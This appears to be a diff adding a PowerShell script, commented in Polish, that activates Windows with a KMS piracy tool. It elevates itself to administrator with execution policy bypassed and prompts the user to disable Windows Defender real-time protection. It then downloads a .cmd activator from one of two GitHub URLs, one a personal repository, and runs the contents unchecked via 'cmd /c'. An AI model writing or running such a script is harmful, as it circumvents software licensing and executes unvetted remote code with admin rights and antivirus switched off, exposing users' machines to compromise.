@@ -1,0 +1,39 @@
+# Pobierz zawartość pliku .bat
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$URLs = @(
+    'https://github.com/abbodi1406/KMS_VL_ALL_AIO/raw/refs/heads/master/KMS_VL_ALL_AIO.cmd',
+    'https://github.com/testmina77/testmina77.github.io/raw/refs/heads/main/ACTIVATOR_BACKUP.cmd'
+)
+
+# check
+if (-not ([Security.Principal.WindowsIdentity]::GetCurrent().Groups | ForEach-Object { $_.Value } -contains 'S-1-5-32-544')) {
+    Write-Host "Użytkownik NIE ma uprawnień administratora."
+    # old: $argList = "$($myinvocation.MyCommand.Definition)"
+    # old: Start-Process powershell -ArgumentList "-Command $argList" -Verb RunAs
+    $argList = "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Definition)`""
+    Start-Process powershell -ArgumentList $argList -Verb RunAs
+    exit 1
+}
+# sprawdz defendeura
+$defenderPreferences = Get-MpPreference
+if (-not $defenderPreferences.DisableRealtimeMonitoring -eq $true) {
+    Write-Host "Windows Defender real-time monitoring is enabled! Disable it in Settings and re run command!"
+	  start windowsdefender://threatsettings/
+	  Read-Host -Prompt "Kliknij enter by kontynuowac"
+}
+
+foreach ($URL in $URLs | Sort-Object { Get-Random }) {
+    try { $cmdContent = Invoke-WebRequest -Uri $URL -UseBasicParsing; break } catch {}
+}
+if (-not $cmdContent) {
+    Write-Host "Failed to download activator from repositories! Quitting..."
+    exit 1
+}
+
+# Zamień nowe linie na pojedyncze polecenie rozdzielone &
+$batCommand = ($cmdContent -split "`r?`n" | ForEach-Object { $_.Trim() }) -join " & "
+
+# Uruchom batch jako cmd /c
+cmd /c "$batCommand"
+Write-Host "Windows Defender real-time monitoring is disabled! Enable it if u want!"
+start windowsdefender://threatsettings/
